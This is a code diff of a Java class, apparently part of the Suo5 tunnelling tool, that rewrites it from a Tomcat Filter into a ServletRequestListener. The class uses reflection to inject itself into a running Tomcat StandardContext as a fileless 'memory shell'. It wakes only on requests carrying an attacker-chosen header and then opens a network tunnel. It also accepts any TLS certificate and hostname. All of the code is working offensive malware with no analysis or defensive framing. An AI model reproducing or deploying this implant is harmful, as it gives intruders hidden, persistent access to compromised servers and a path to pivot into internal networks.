@@ -6,6 +6,7 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.lang.reflect.Field;
+import java.lang.reflect.Method;
 import java.net.HttpURLConnection;
 import java.net.InetAddress;
 import java.net.InetSocketAddress;
@@ -17,7 +18,6 @@ import java.security.SecureRandom;
 import java.security.cert.CertificateException;
 import java.security.cert.X509Certificate;
 import java.util.Enumeration;
-import java.util.EnumSet;
 import java.util.HashMap;
 import javax.net.ssl.HostnameVerifier;
 import javax.net.ssl.HttpsURLConnection;
@@ -26,22 +26,17 @@ import javax.net.ssl.SSLContext;
 import javax.net.ssl.SSLSession;
 import javax.net.ssl.TrustManager;
 import javax.net.ssl.X509TrustManager;
-import javax.servlet.DispatcherType;
-import javax.servlet.Filter;
-import javax.servlet.FilterChain;
-import javax.servlet.FilterConfig;
-import javax.servlet.ServletException;
+import javax.servlet.ServletContext;
 import javax.servlet.ServletInputStream;
 import javax.servlet.ServletOutputStream;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
+import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 
-public class Suo5Filter extends ClassLoader implements Filter, Runnable, HostnameVerifier, X509TrustManager {
+public class Suo5Listener extends ClassLoader implements ServletRequestListener, Runnable, HostnameVerifier, X509TrustManager {
     public HttpServletRequest request = null;
     public HttpServletResponse response = null;
-    public String path = "/suo5";
     public static String headerName;
     public static String headerValue;
     public static HashMap addrs = collectAddr();
@@ -49,14 +44,14 @@ public class Suo5Filter extends ClassLoader implements Filter, Runnable, Hostnam
     InputStream gInStream;
     OutputStream gOutStream;
 
-    public Suo5Filter() {
+    public Suo5Listener() {
     }
 
-    public Suo5Filter(ClassLoader c) {
+    public Suo5Listener(ClassLoader c) {
         super(c);
     }
 
-    public Suo5Filter(InputStream var1, OutputStream var2) {
+    public Suo5Listener(InputStream var1, OutputStream var2) {
         this.gInStream = var1;
         this.gOutStream = var2;
     }
@@ -68,18 +63,10 @@ public class Suo5Filter extends ClassLoader implements Filter, Runnable, Hostnam
     public boolean equals(Object obj) {
         this.parseObj(obj);
         // 从请求头读取配置
-        String pathFromHeader = this.request.getHeader("path");
         String headerNameFromHeader = this.request.getHeader("headerName");
         String headerValueFromHeader = this.request.getHeader("headerValue");
 
         // 设置值
-        if (pathFromHeader != null && !pathFromHeader.isEmpty()) {
-            path = pathFromHeader;
-            // 确保 path 以 / 开头
-            if (!path.startsWith("/")) {
-                path = "/" + path;
-            }
-        }
         if (headerNameFromHeader != null && !headerNameFromHeader.isEmpty()) {
             headerName = headerNameFromHeader;
         }
@@ -95,7 +82,7 @@ public class Suo5Filter extends ClassLoader implements Filter, Runnable, Hostnam
             this.response.setContentType("text/html");
             this.request.setCharacterEncoding("UTF-8");
             this.response.setCharacterEncoding("UTF-8");
-            output.append(this.addFilter());
+            output.append(this.addListener());
             output.append(" | Header-Name: " + headerName + " | Header-Value: " + headerValue);
         } catch (Exception var7) {
             output.append("ERROR:// " + var7.toString());
@@ -143,106 +130,76 @@ public class Suo5Filter extends ClassLoader implements Filter, Runnable, Hostnam
         }
     }
 
-    public String addFilter() throws Exception {
-        javax.servlet.ServletContext servletContext = this.request.getServletContext();
-        Filter filter = this;
-        // 使用 path 作为 filterName，确保每个 path 都有独立的 Filter
-        String filterName = "Suo5Filter" + this.path.replace("/", "_");
-        if (filterName.startsWith("_")) {
-            filterName = filterName.substring(1);
-        }
-        // 拦截 path 下的所有请求
-        String url = this.path + "/*";
-        if (servletContext.getFilterRegistration(filterName) == null) {
-            Field contextField = null;
-            org.apache.catalina.core.ApplicationContext applicationContext = null;
-            org.apache.catalina.core.StandardContext standardContext = null;
-            Field stateField = null;
-            javax.servlet.FilterRegistration.Dynamic filterRegistration = null;
-
-            String var11;
-            try {
-                contextField = servletContext.getClass().getDeclaredField("context");
-                contextField.setAccessible(true);
-                applicationContext = (org.apache.catalina.core.ApplicationContext)contextField.get(servletContext);
-                contextField = applicationContext.getClass().getDeclaredField("context");
-                contextField.setAccessible(true);
-                standardContext = (org.apache.catalina.core.StandardContext)contextField.get(applicationContext);
-                stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
-                stateField.setAccessible(true);
-                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
-                filterRegistration = servletContext.addFilter(filterName, filter);
-                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
-                java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");
-                filterStartMethod.setAccessible(true);
-                filterStartMethod.invoke(standardContext, (Object[])null);
-                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
-                var11 = null;
-
-                Class filterMap;
-                try {
-                    filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
-                } catch (Exception var21) {
-                    filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
-                }
-
-                java.lang.reflect.Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
-                Object[] filterMaps = (Object[])((Object[])findFilterMaps.invoke(standardContext));
-
-                for(int i = 0; i < filterMaps.length; ++i) {
-                    Object filterMapObj = filterMaps[i];
-                    findFilterMaps = filterMap.getMethod("getFilterName");
-                    String name = (String)findFilterMaps.invoke(filterMapObj);
-                    if (name.equalsIgnoreCase(filterName)) {
-                        filterMaps[i] = filterMaps[0];
-                        filterMaps[0] = filterMapObj;
-                    }
-                }
-
-                String var25 = "Success";
-                return var25;
-            } catch (Exception var22) {
-                var11 = var22.getMessage();
-            } finally {
-                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
-            }
-
-            return var11;
-        } else {
-            return "Filter already exists";
-        }
-    }
-
-    public void init(FilterConfig var1) throws ServletException {
-    }
-
-    public void destroy() {
-    }
-
-    public void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3) throws IOException, ServletException {
-        HttpServletRequest var4 = (HttpServletRequest)var1;
-        HttpServletResponse var5 = (HttpServletResponse)var2;
+    public String addListener() throws Exception {
+        ServletContext servletContext = this.request.getServletContext();
+        ServletRequestListener listener = this;
+        String listenerName = "Suo5Listener";
 
         try {
-            String var6 = var4.getHeader("Content-Type");
-            if (var4.getHeader(headerName) != null && var4.getHeader(headerName).contains(headerValue) && var6 != null) {
-                if (var6.equals("application/plain")) {
-                    this.tryFullDuplex(var4, var5);
+            // 获取 ServletContext 的 ApplicationContext
+            Field contextField = servletContext.getClass().getDeclaredField("context");
+            contextField.setAccessible(true);
+            Object applicationContext = contextField.get(servletContext);
+
+            // 获取 StandardContext
+            Field standardContextField = applicationContext.getClass().getDeclaredField("context");
+            standardContextField.setAccessible(true);
+            Object standardContext = standardContextField.get(applicationContext);
+
+            // 获取 applicationEventListeners
+            Method getApplicationEventListenersMethod = standardContext.getClass().getMethod("getApplicationEventListeners");
+            Object[] listeners = (Object[]) getApplicationEventListenersMethod.invoke(standardContext);
+
+            // 检查是否已存在
+            for (Object existingListener : listeners) {
+                if (existingListener instanceof ServletRequestListener && existingListener.getClass().getName().equals(this.getClass().getName())) {
+                    return "Listener already exists";
+                }
+            }
+
+            // 添加新 Listener
+            Method addApplicationEventListenerMethod = standardContext.getClass().getMethod("addApplicationEventListener", Object.class);
+            addApplicationEventListenerMethod.invoke(standardContext, listener);
+
+            return "Success";
+        } catch (Exception e) {
+            return "ERROR: " + e.getMessage();
+        }
+    }
+
+    public void requestInitialized(ServletRequestEvent var1) {
+        HttpServletRequest var2 = (HttpServletRequest)var1.getServletRequest();
+
+        try {
+            String var3 = var2.getContentType();
+            if (var2.getHeader(headerName) != null && var2.getHeader(headerName).contains(headerValue) && var3 != null) {
+                HttpServletResponse var4 = (HttpServletResponse)this.getResponseFromRequest(var2);
+                if (var3.equals("application/plain")) {
+                    this.tryFullDuplex(var2, var4);
                     return;
                 }
 
-                if (var6.equals("application/octet-stream")) {
-                    this.processDataBio(var4, var5);
+                if (var3.equals("application/octet-stream")) {
+                    this.processDataBio(var2, var4);
                 } else {
-                    this.processDataUnary(var4, var5);
+                    this.processDataUnary(var2, var4);
                 }
-
-                return;
             }
-        } catch (Throwable var7) {
+        } catch (Throwable var5) {
         }
 
-        var3.doFilter(var1, var2);
+    }
+
+    private Object getResponseFromRequest(Object var1) throws Exception {
+        Object var2 = null;
+
+        try {
+            var2 = getFieldValue(getFieldValue(var1, "request"), "response");
+        } catch (Exception var4) {
+            var2 = getFieldValue(var1, "response");
+        }
+
+        return var2;
     }
 
     public void readFull(InputStream var1, byte[] var2) throws IOException, InterruptedException {
@@ -451,7 +408,7 @@ public class Suo5Filter extends ClassLoader implements Filter, Runnable, Hostnam
             Thread var10 = null;
 
             try {
-                Suo5Filter var11 = new Suo5Filter(var22, var6);
+                Suo5Listener var11 = new Suo5Listener(var22, var6);
                 var10 = new Thread(var11);
                 var10.start();
                 this.readReq(var3, var21);
@@ -720,5 +677,33 @@ public class Suo5Filter extends ClassLoader implements Filter, Runnable, Hostnam
 
     public X509Certificate[] getAcceptedIssuers() {
         return new X509Certificate[0];
+    }
+
+    public void requestDestroyed(ServletRequestEvent var1) {
+    }
+
+    public static Object getFieldValue(Object var0, String var1) throws Exception {
+        Object var2 = null;
+        Class var3 = var0.getClass();
+
+        while(true) {
+            if (var3 == Object.class) {
+                if (var2 == null) {
+                    throw new NoSuchFieldException(var0.getClass().getName() + " Field not found: " + var1);
+                }
+                break;
+            }
+
+            try {
+                Field var4 = var3.getDeclaredField(var1);
+                var4.setAccessible(true);
+                var2 = var4.get(var0);
+                break;
+            } catch (NoSuchFieldException var5) {
+                var3 = var3.getSuperclass();
+            }
+        }
+
+        return var2;
     }
 }
